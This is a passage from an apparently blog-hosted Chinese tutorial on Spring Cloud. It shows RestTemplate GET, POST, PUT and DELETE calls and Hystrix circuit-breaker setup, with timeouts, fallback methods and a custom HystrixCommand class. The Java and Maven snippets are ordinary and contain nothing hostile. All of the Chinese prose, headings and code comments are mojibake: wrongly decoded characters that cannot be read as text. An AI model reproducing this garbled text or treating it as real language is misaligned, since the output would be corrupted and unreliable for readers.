<td>ç»¼åˆåˆ¤æ–­æœåŠ¡èŠ‚ç‚¹æ‰€åœ¨åŒºåŸŸçš„æ€§èƒ½å’ŒæœåŠ¡èŠ‚ç‚¹çš„å¯ç”¨æ€§ï¼Œæ¥å†³å®šé€‰æ‹©å“ªä¸ªæœåŠ¡ï¼›</td>
</tr>
</tbody></table>
<h2 id="5-4-Restè¯·æ±‚æ¨¡æ¿ç±»è§£è¯»"><a href="#5-4-Restè¯·æ±‚æ¨¡æ¿ç±»è§£è¯»" class="headerlink" title="5.4 Restè¯·æ±‚æ¨¡æ¿ç±»è§£è¯»"></a>5.4 Restè¯·æ±‚æ¨¡æ¿ç±»è§£è¯»</h2><p>å½“æˆ‘ä»¬ä»æœåŠ¡æ¶ˆè´¹ç«¯å»è°ƒç”¨æœåŠ¡æä¾›è€…çš„æœåŠ¡çš„æ—¶å€™ï¼Œä½¿ç”¨äº†ä¸€ä¸ªæå…¶æ–¹ä¾¿çš„å¯¹è±¡å«RestTemplateï¼Œå½“æ—¶æˆ‘ä»¬åªä½¿ç”¨äº†RestTemplateä¸­æœ€ç®€å•çš„ä¸€ä¸ªåŠŸèƒ½getForEntityå‘èµ·äº†ä¸€ä¸ªgetè¯·æ±‚å»è°ƒç”¨æœåŠ¡ç«¯çš„æ•°æ®ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬è¿˜é€šè¿‡é…ç½®@LoadBalancedæ³¨è§£å¼€å¯å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼ŒRestTemplateçš„åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥è¯¦ç»†çš„çœ‹ä¸€ä¸‹RestTemplateä¸­å‡ ç§å¸¸è§è¯·æ±‚æ–¹æ³•çš„ä½¿ç”¨ã€‚</p>
<p>åœ¨æ—¥å¸¸æ“ä½œä¸­ï¼ŒåŸºäºRestçš„æ–¹å¼é€šå¸¸æ˜¯å››ç§æƒ…å†µï¼Œå®ƒä»¬åˆ†è¡¨æ˜¯ï¼š</p>
<p><strong>GETè¯·æ±‚ â€“æŸ¥è¯¢æ•°æ®</strong></p>
<p><strong>POSTè¯·æ±‚ â€“æ·»åŠ æ•°æ®</strong></p>
<p><strong>PUTè¯·æ±‚ â€“ ä¿®æ”¹æ•°æ®</strong></p>
<p><strong>DELETEè¯·æ±‚ â€“åˆ é™¤æ•°æ®</strong></p>
<p>ä¸‹é¢æˆ‘ä»¬é€ä¸€è§£è¯»ã€‚</p>
<h2 id="5-5-RestTemplateçš„GETè¯·æ±‚"><a href="#5-5-RestTemplateçš„GETè¯·æ±‚" class="headerlink" title="5.5 RestTemplateçš„GETè¯·æ±‚"></a>5.5 RestTemplateçš„GETè¯·æ±‚</h2><p>Getè¯·æ±‚å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p>ç¬¬ä¸€ç§ï¼šgetForEntity</p>
<p>è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªResponseEntity<T>å¯¹è±¡ï¼ŒResponseEntity<T>æ˜¯Springå¯¹HTTPè¯·æ±‚å“åº”çš„å°è£…ï¼ŒåŒ…æ‹¬äº†å‡ ä¸ªé‡è¦çš„å…ƒç´ ï¼Œæ¯”å¦‚å“åº”ç ã€contentTypeã€contentLengthã€å“åº”æ¶ˆæ¯ä½“ç­‰ï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResponseEntity&lt;String&gt; responseEntity = restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello&quot;</span>, String.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> responseEntity.getBody();</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">statusCode</span> <span class="operator">=</span> responseEntity.getStatusCode();</span><br><span class="line"><span class="type">int</span> <span class="variable">statusCodeValue</span> <span class="operator">=</span> responseEntity.getStatusCodeValue();</span><br><span class="line"><span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> responseEntity.getHeaders();</span><br><span class="line"></span><br><span class="line">System.out.println(body);</span><br><span class="line">System.out.println(statusCode);</span><br><span class="line">System.out.println(statusCodeValue);</span><br><span class="line">System.out.println(headers);</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä»£ç ï¼š</p>
<p>getForEntityæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦è°ƒç”¨çš„æœåŠ¡çš„åœ°å€ï¼Œå³æœåŠ¡æä¾›è€…æä¾›çš„<a href="http://01-springcloud-service-provider/service/hello%E6%8E%A5%E5%8F%A3%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E6%98%AF%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%90%8D%E8%B0%83%E7%94%A8%E8%80%8C%E4%B8%8D%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%B9%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%9C%B0%E5%9D%80%E5%B0%B1%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8Ribbon%E5%AE%9E%E7%8E%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%BA%86%E3%80%82">http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/helloæ¥å£åœ°å€ï¼Œæ³¨æ„è¿™é‡Œæ˜¯é€šè¿‡æœåŠ¡åè°ƒç”¨è€Œä¸æ˜¯æœåŠ¡åœ°å€ï¼Œå¦‚æœæ”¹ä¸ºæœåŠ¡åœ°å€å°±æ— æ³•ä½¿ç”¨Ribbonå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡äº†ã€‚</a></p>
<p>getForEntityæ–¹æ³•ç¬¬äºŒä¸ªå‚æ•°String.classè¡¨ç¤ºå¸Œæœ›è¿”å›çš„bodyç±»å‹æ˜¯Stringç±»å‹ï¼Œå¦‚æœå¸Œæœ›è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚Userå¯¹è±¡ï¼›</p>
<p>å¦å¤–ä¸¤ä¸ªé‡è½½æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">getForEntity</span><span class="params">(String url, Class&lt;T&gt; responseType, Object... uriVariables)</span> <span class="keyword">throws</span> RestClientException</span><br><span class="line"> </span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">Object [] params=&#123;<span class="number">1</span>,â€å¼ æ— å¿Œâ€&#125;;</span><br><span class="line">restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello?id=&#123;1&#125;&amp;name=&#123;2&#125;&quot;</span>, String.class, params).getBody();</span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">getForEntity</span><span class="params">(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)</span> <span class="keyword">throws</span> RestClientException</span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">Map&lt;String, Object&gt; paramMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">paramMap.put(<span class="string">&quot;id&quot;</span>, <span class="number">1</span>);</span><br><span class="line">paramMap.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;å¼ æ— å¿Œ&quot;</span>);</span><br><span class="line">restTemplate.getForEntity(<span class="string">&quot;http://01-SPRINGCLOUD-SERVICE-PROVIDER/service/hello?id=&#123;id&#125;&amp;name=&#123;name&#125;&quot;</span>, String.class, paramMap).getBody();                         </span><br></pre></td></tr></table></figure>

<p> ç¬¬äºŒç§ï¼šgetForObject()<br>ä¸getForEntityä½¿ç”¨ç±»ä¼¼ï¼Œåªä¸è¿‡getForObjectæ˜¯åœ¨getForEntityåŸºç¡€ä¸Šè¿›è¡Œäº†å†æ¬¡å°è£…ï¼Œå¯ä»¥å°†httpçš„å“åº”ä½“bodyä¿¡æ¯è½¬åŒ–æˆæŒ‡å®šçš„å¯¹è±¡ï¼Œæ–¹ä¾¿æˆ‘ä»¬çš„ä»£ç å¼€å‘ï¼›<br>å½“ä½ ä¸éœ€è¦è¿”å›å“åº”ä¸­çš„å…¶ä»–ä¿¡æ¯ï¼Œåªéœ€è¦bodyä½“ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ›´æ–¹ä¾¿ï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">å®ƒä¹Ÿæœ‰ä¸¤ä¸ªé‡è½½çš„æ–¹æ³•ï¼Œå’ŒgetForEntityç›¸ä¼¼ï¼›</span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(URI url, Class&lt;T&gt; responseType)</span> <span class="keyword">throws</span> RestClientException;</span><br><span class="line"> </span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(String url, Class&lt;T&gt; responseType, Object... uriVariables)</span> <span class="keyword">throws</span> RestClientException;</span><br><span class="line"> </span><br><span class="line">&lt;T&gt; T <span class="title function_">getForObject</span><span class="params">(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)</span> <span class="keyword">throws</span> RestClientException;</span><br></pre></td></tr></table></figure>

<h2 id="5-6-RestTemplateçš„POSTè¯·æ±‚ï¼š"><a href="#5-6-RestTemplateçš„POSTè¯·æ±‚ï¼š" class="headerlink" title="5.6 RestTemplateçš„POSTè¯·æ±‚ï¼š"></a>5.6 RestTemplateçš„POSTè¯·æ±‚ï¼š</h2><p>Postä¸Getè¯·æ±‚éå¸¸ç±»ä¼¼ï¼š</p>
<p>restTemplate.postForObject()</p>
<p>restTemplate.postForEntity()</p>
<p>restTemplate.postForLocation()</p>
<h2 id="5-7-RestTemplateçš„PUTè¯·æ±‚ï¼š"><a href="#5-7-RestTemplateçš„PUTè¯·æ±‚ï¼š" class="headerlink" title="5.7 RestTemplateçš„PUTè¯·æ±‚ï¼š"></a>5.7 RestTemplateçš„PUTè¯·æ±‚ï¼š</h2><p>restTemplate.put();</p>
<h2 id="5-8-RestTemplateçš„DELETEè¯·æ±‚ï¼š"><a href="#5-8-RestTemplateçš„DELETEè¯·æ±‚ï¼š" class="headerlink" title="5.8 RestTemplateçš„DELETEè¯·æ±‚ï¼š"></a>5.8 RestTemplateçš„DELETEè¯·æ±‚ï¼š</h2><p>restTemplate.delete();</p>
<h1 id="ç¬¬å…­ç« -æœåŠ¡ç†”æ–­Hystrix"><a href="#ç¬¬å…­ç« -æœåŠ¡ç†”æ–­Hystrix" class="headerlink" title="ç¬¬å…­ç«  æœåŠ¡ç†”æ–­Hystrix"></a>ç¬¬å…­ç«  æœåŠ¡ç†”æ–­Hystrix</h1><h2 id="6-1-Hystrixæ˜¯ä»€ä¹ˆ"><a href="#6-1-Hystrixæ˜¯ä»€ä¹ˆ" class="headerlink" title="6.1 Hystrixæ˜¯ä»€ä¹ˆ"></a>6.1 Hystrixæ˜¯ä»€ä¹ˆ</h2><p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œæˆ‘ä»¬æ˜¯å°†ä¸€ä¸ªå•ä½“åº”ç”¨æ‹†åˆ†æˆå¤šä¸ªæœåŠ¡å•å…ƒï¼Œå„ä¸ªæœåŠ¡å•å…ƒä¹‹é—´é€šè¿‡æ³¨å†Œä¸­å¿ƒå½¼æ­¤å‘ç°å’Œæ¶ˆè´¹å¯¹æ–¹æä¾›çš„æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡å•å…ƒéƒ½æ˜¯å•ç‹¬éƒ¨ç½²ï¼Œåœ¨å„è‡ªçš„æœåŠ¡è¿›ç¨‹ä¸­è¿è¡Œï¼ŒæœåŠ¡ä¹‹é—´é€šè¿‡è¿œç¨‹è°ƒç”¨å®ç°ä¿¡æ¯äº¤äº’ï¼Œé‚£ä¹ˆå½“æŸä¸ªæœåŠ¡çš„å“åº”å¤ªæ…¢æˆ–è€…æ•…éšœï¼Œåˆæˆ–è€…å› ä¸ºç½‘ç»œæ³¢åŠ¨æˆ–æ•…éšœï¼Œåˆ™ä¼šé€ æˆè°ƒç”¨è€…å»¶è¿Ÿæˆ–è°ƒç”¨å¤±è´¥ï¼Œå½“å¤§é‡è¯·æ±‚åˆ°è¾¾ï¼Œåˆ™ä¼šé€ æˆè¯·æ±‚çš„å †ç§¯ï¼Œå¯¼è‡´è°ƒç”¨è€…çš„çº¿ç¨‹æŒ‚èµ·ï¼Œä»è€Œå¼•å‘è°ƒç”¨è€…ä¹Ÿæ— æ³•å“åº”ï¼Œè°ƒç”¨è€…ä¹Ÿå‘ç”Ÿæ•…éšœã€‚</p>
<p>æ¯”å¦‚ç”µå•†ä¸­çš„ç”¨æˆ·ä¸‹è®¢å•ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæœåŠ¡ï¼Œä¸€ä¸ªä¸‹è®¢å•æœåŠ¡ï¼Œä¸€ä¸ªå‡åº“å­˜æœåŠ¡ï¼Œå½“ç”¨æˆ·ä¸‹è®¢å•æ—¶è°ƒç”¨ä¸‹è®¢å•æœåŠ¡ï¼Œç„¶åä¸‹è®¢å•æœåŠ¡åˆè°ƒç”¨å‡åº“å­˜æœåŠ¡ï¼Œå¦‚æœå‡åº“å­˜æœåŠ¡å“åº”å»¶è¿Ÿæˆ–è€…æ²¡æœ‰å“åº”ï¼Œåˆ™ä¼šé€ æˆä¸‹è®¢å•æœåŠ¡çš„çº¿ç¨‹æŒ‚èµ·ç­‰å¾…ï¼Œå¦‚æœå¤§é‡çš„ç”¨æˆ·è¯·æ±‚ä¸‹è®¢å•ï¼Œæˆ–å¯¼è‡´å¤§é‡çš„è¯·æ±‚å †ç§¯ï¼Œå¼•èµ·ä¸‹è®¢å•æœåŠ¡ä¹Ÿä¸å¯ç”¨ï¼Œå¦‚æœè¿˜æœ‰å¦å¤–ä¸€ä¸ªæœåŠ¡ä¾èµ–äºè®¢å•æœåŠ¡ï¼Œæ¯”å¦‚ç”¨æˆ·æœåŠ¡ï¼Œå®ƒéœ€è¦æŸ¥è¯¢ç”¨æˆ·è®¢å•ï¼Œé‚£ä¹ˆç”¨æˆ·æœåŠ¡æŸ¥è¯¢è®¢å•ä¹Ÿä¼šå¼•èµ·å¤§é‡çš„å»¶è¿Ÿå’Œè¯·æ±‚å †ç§¯ï¼Œå¯¼è‡´ç”¨æˆ·æœåŠ¡ä¹Ÿä¸å¯ç”¨ã€‚</p>
<p>æ‰€ä»¥åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¾ˆå®¹æ˜“é€ æˆæœåŠ¡æ•…éšœçš„è”“å»¶ï¼Œå¼•å‘æ•´ä¸ªå¾®æœåŠ¡ç³»ç»Ÿç˜«ç—ªä¸å¯ç”¨ã€‚</p>
<p>ä¸ºäº†è§£å†³æ­¤é—®é¢˜ï¼Œå¾®æœåŠ¡æ¶æ„ä¸­å¼•å…¥äº†ä¸€ç§å«ç†”æ–­å™¨çš„æœåŠ¡ä¿æŠ¤æœºåˆ¶ã€‚</p>
<p>ç†”æ–­å™¨ä¹Ÿæœ‰å«æ–­è·¯å™¨ï¼Œä»–ä»¬è¡¨ç¤ºåŒä¸€ä¸ªæ„æ€ï¼Œæœ€æ—©æ¥æºäºå¾®æœåŠ¡ä¹‹çˆ¶Martin Fowlerçš„è®ºæ–‡CircuitBreakerä¸€æ–‡ã€‚â€œç†”æ–­å™¨â€æœ¬èº«æ˜¯ä¸€ç§å¼€å…³è£…ç½®ï¼Œç”¨äºåœ¨ç”µè·¯ä¸Šä¿æŠ¤çº¿è·¯è¿‡è½½ï¼Œå½“çº¿è·¯ä¸­æœ‰ç”µå™¨å‘ç”ŸçŸ­è·¯æ—¶ï¼Œèƒ½å¤ŸåŠæ—¶åˆ‡æ–­æ•…éšœç”µè·¯ï¼Œé˜²æ­¢å‘ç”Ÿè¿‡è½½ã€å‘çƒ­ç”šè‡³èµ·ç«ç­‰ä¸¥é‡åæœã€‚</p>
<p>å¾®æœåŠ¡æ¶æ„ä¸­çš„ç†”æ–­å™¨ï¼Œå°±æ˜¯å½“è¢«è°ƒç”¨æ–¹æ²¡æœ‰å“åº”ï¼Œè°ƒç”¨æ–¹ç›´æ¥è¿”å›ä¸€ä¸ªé”™è¯¯å“åº”å³å¯ï¼Œè€Œä¸æ˜¯é•¿æ—¶é—´çš„ç­‰å¾…ï¼Œè¿™æ ·é¿å…è°ƒç”¨æ—¶å› ä¸ºç­‰å¾…è€Œçº¿ç¨‹ä¸€ç›´å¾—ä¸åˆ°é‡Šæ”¾ï¼Œé¿å…æ•…éšœåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿé—´è”“å»¶ï¼›</p>
<p>Spring Cloud Hystrixå®ç°äº†ç†”æ–­å™¨ã€çº¿ç¨‹éš”ç¦»ç­‰ä¸€ç³»åˆ—æœåŠ¡ä¿æŠ¤åŠŸèƒ½ã€‚è¯¥åŠŸèƒ½ä¹Ÿæ˜¯åŸºäºNetflixçš„å¼€æºæ¡†æ¶Hystrixå®ç°çš„ï¼Œè¯¥æ¡†æ¶çš„ç›®æ ‡åœ¨äºé€šè¿‡æ§åˆ¶é‚£äº›è®¿é—®è¿œç¨‹ç³»ç»Ÿã€æœåŠ¡å’Œç¬¬ä¸‰æ–¹åº“çš„èŠ‚ç‚¹ï¼Œä»è€Œå¯¹å»¶è¿Ÿå’Œæ•…éšœæä¾›æ›´å¼ºå¤§çš„å®¹é”™èƒ½åŠ›ã€‚Hystrixå…·å¤‡æœåŠ¡é™çº§ã€æœåŠ¡ç†”æ–­ã€çº¿ç¨‹å’Œä¿¡å·éš”ç¦»ã€è¯·æ±‚ç¼“å­˜ã€è¯·æ±‚åˆå¹¶ä»¥åŠæœåŠ¡ç›‘æ§ç­‰å¼ºå¤§åŠŸèƒ½ã€‚</p>
<h2 id="6-2-Hystrixå¿«é€Ÿå…¥é—¨"><a href="#6-2-Hystrixå¿«é€Ÿå…¥é—¨" class="headerlink" title="6.2 Hystrixå¿«é€Ÿå…¥é—¨"></a>6.2 Hystrixå¿«é€Ÿå…¥é—¨</h2><p>åœ¨SpringCloudä¸­ä½¿ç”¨ç†”æ–­å™¨Hystrixæ˜¯éå¸¸ç®€å•å’Œæ–¹ä¾¿çš„ï¼Œåªéœ€è¦ç®€å•ä¸¤æ­¥å³å¯ï¼š</p>
<ol>
<li>æ·»åŠ ä¾èµ–</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloudç†”æ–­å™¨èµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>åœ¨å…¥å£ç±»ä¸­ä½¿ç”¨@EnableCircuitBreakeræ³¨è§£å¼€å¯æ–­è·¯å™¨åŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸º@SpringCloudApplicationçš„æ³¨è§£ä»£æ›¿ä¸»ç±»ä¸Šçš„ä¸‰ä¸ªæ³¨è§£ï¼›</li>
<li>åœ¨è°ƒç”¨è¿œç¨‹æœåŠ¡çš„æ–¹æ³•ä¸Šæ·»åŠ æ³¨è§£ï¼š@HystrixCommand(fallbackMethod&#x3D;â€errorâ€)</li>
</ol>
<h2 id="6-3-æœåŠ¡æ¶ˆè´¹è€…Hystrixæµ‹è¯•"><a href="#6-3-æœåŠ¡æ¶ˆè´¹è€…Hystrixæµ‹è¯•" class="headerlink" title="6.3 æœåŠ¡æ¶ˆè´¹è€…Hystrixæµ‹è¯•"></a>6.3 æœåŠ¡æ¶ˆè´¹è€…Hystrixæµ‹è¯•</h2><p>hystrixé»˜è®¤è¶…æ—¶æ—¶é—´æ˜¯1000æ¯«ç§’ï¼Œå¦‚æœä½ åç«¯çš„å“åº”è¶…è¿‡æ­¤æ—¶é—´ï¼Œå°±ä¼šè§¦å‘æ–­è·¯å™¨ï¼›</p>
<p>ä¿®æ”¹hystrixçš„é»˜è®¤è¶…æ—¶æ—¶é—´ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(fallbackMethod=&quot;error&quot;, commandProperties=&#123;</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name=&quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;1500&quot;)&#125;)</span> <span class="comment">//ç†”æ–­å™¨ï¼Œè°ƒç”¨ä¸é€šï¼Œå›è°ƒerror()æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">webHello</span> <span class="params">()</span> &#123;</span><br></pre></td></tr></table></figure>

<h2 id="6-4-Hystrixçš„æœåŠ¡é™çº§"><a href="#6-4-Hystrixçš„æœåŠ¡é™çº§" class="headerlink" title="6.4 Hystrixçš„æœåŠ¡é™çº§"></a>6.4 Hystrixçš„æœåŠ¡é™çº§</h2><p>æœ‰äº†æœåŠ¡çš„ç†”æ–­ï¼Œéšä¹‹å°±ä¼šæœ‰æœåŠ¡çš„é™çº§ï¼Œæ‰€è°“æœåŠ¡é™çº§ï¼Œå°±æ˜¯å½“æŸä¸ªæœåŠ¡ç†”æ–­ä¹‹åï¼ŒæœåŠ¡ç«¯æä¾›çš„æœåŠ¡å°†ä¸å†è¢«è°ƒç”¨ï¼Œæ­¤æ—¶ç”±å®¢æˆ·ç«¯è‡ªå·±å‡†å¤‡ä¸€ä¸ªæœ¬åœ°çš„fallbackå›è°ƒï¼Œè¿”å›ä¸€ä¸ªé»˜è®¤å€¼æ¥ä»£è¡¨æœåŠ¡ç«¯çš„è¿”å›ï¼› </p>
<p>è¿™ç§åšæ³•ï¼Œè™½ç„¶ä¸èƒ½å¾—åˆ°æ­£ç¡®çš„è¿”å›ç»“æœï¼Œä½†è‡³å°‘ä¿è¯äº†æœåŠ¡çš„å¯ç”¨ï¼Œæ¯”ç›´æ¥æŠ›å‡ºé”™è¯¯æˆ–æœåŠ¡ä¸å¯ç”¨è¦å¥½å¾ˆå¤šï¼Œå½“ç„¶è¿™éœ€è¦æ ¹æ®å…·ä½“çš„ä¸šåŠ¡åœºæ™¯æ¥é€‰æ‹©ï¼›</p>
<h2 id="6-5-Hystrixçš„å¼‚å¸¸å¤„ç†"><a href="#6-5-Hystrixçš„å¼‚å¸¸å¤„ç†" class="headerlink" title="6.5 Hystrixçš„å¼‚å¸¸å¤„ç†"></a>6.5 Hystrixçš„å¼‚å¸¸å¤„ç†</h2><p>æˆ‘ä»¬åœ¨è°ƒç”¨æœåŠ¡æä¾›è€…æ—¶ï¼Œæˆ‘ä»¬è‡ªå·±ä¹Ÿæœ‰å¯èƒ½ä¼šæŠ›å¼‚å¸¸ï¼Œé»˜è®¤æƒ…å†µä¸‹æ–¹æ³•æŠ›äº†å¼‚å¸¸ä¼šè‡ªåŠ¨è¿›è¡ŒæœåŠ¡é™çº§ï¼Œäº¤ç»™æœåŠ¡é™çº§ä¸­çš„æ–¹æ³•å»å¤„ç†ï¼›</p>
<p>å½“æˆ‘ä»¬è‡ªå·±å‘ç”Ÿå¼‚å¸¸åï¼Œåªéœ€è¦åœ¨æœåŠ¡é™çº§æ–¹æ³•ä¸­æ·»åŠ ä¸€ä¸ªThrowableç±»å‹çš„å‚æ•°å°±èƒ½å¤Ÿè·å–åˆ°æŠ›å‡ºçš„å¼‚å¸¸çš„ç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">error</span><span class="params">(Throwable throwable)</span> &#123;</span><br><span class="line">    System.out.println(throwable.getMessage());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°çœ‹åˆ°å¼‚å¸¸çš„ç±»å‹ï¼›</span><br><span class="line">å¦‚æœè¿œç¨‹æœåŠ¡æœ‰ä¸€ä¸ªå¼‚å¸¸æŠ›å‡ºåæˆ‘ä»¬ä¸å¸Œæœ›è¿›å…¥åˆ°æœåŠ¡é™çº§æ–¹æ³•ä¸­å»å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å°†å¼‚å¸¸æŠ›ç»™ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨<span class="meta">@HystrixCommand</span>æ³¨è§£ä¸­æ·»åŠ å¿½ç•¥å¼‚å¸¸ï¼Œå¦‚ä¸‹ï¼š</span><br><span class="line"><span class="meta">@HystrixCommand(fallbackMethod=&quot;error&quot;, ignoreExceptions = Exception.class)</span></span><br></pre></td></tr></table></figure>

<p><strong>è‡ªå®šä¹‰Hystrixè¯·æ±‚çš„æœåŠ¡å¼‚å¸¸ç†”æ–­å¤„ç†</strong></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ç±»ç»§æ‰¿è‡ªHystrixCommandæ¥å®ç°è‡ªå®šä¹‰çš„Hystrixè¯·æ±‚ï¼Œåœ¨getFallbackæ–¹æ³•ä¸­è°ƒç”¨getExecutionExceptionæ–¹æ³•æ¥è·å–æœåŠ¡æŠ›å‡ºçš„å¼‚å¸¸ï¼›</p>
<p>è‡ªå®šå®šä¹‰ç†”æ–­å™¨ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHystrixCommand</span> <span class="keyword">extends</span> <span class="title class_">HystrixCommand</span>&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String url</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">MyHystrixCommand</span> <span class="params">(Setter setter, RestTemplate restTemplate,String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>(setter);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.restTemplate = restTemplate;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">this</span>.url=url;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> String <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> restTemplate.getForEntity(url, String.class).getBody();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   * å½“è¿œç¨‹æœåŠ¡è¶…æ—¶ã€å¼‚å¸¸ã€ä¸å¯ç”¨ç­‰æƒ…å†µæ—¶ï¼Œä¼šè§¦å‘è¯¥ç†”æ–­æ–¹æ³•</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getFallback</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">throwable</span> <span class="operator">=</span> <span class="built_in">super</span>.getExecutionException();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    System.out.println(throwable.getMessage());</span><br><span class="line"></span><br><span class="line">    System.out.println(throwable.getStackTrace());</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®ç°æœåŠ¡ç†”æ–­/é™çº§é€»è¾‘</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ç¼–å†™å®¢æˆ·ç«¯è¯·æ±‚æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">test2</span> <span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="type">MyHystrixCommand</span> <span class="variable">myHystrixCommand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 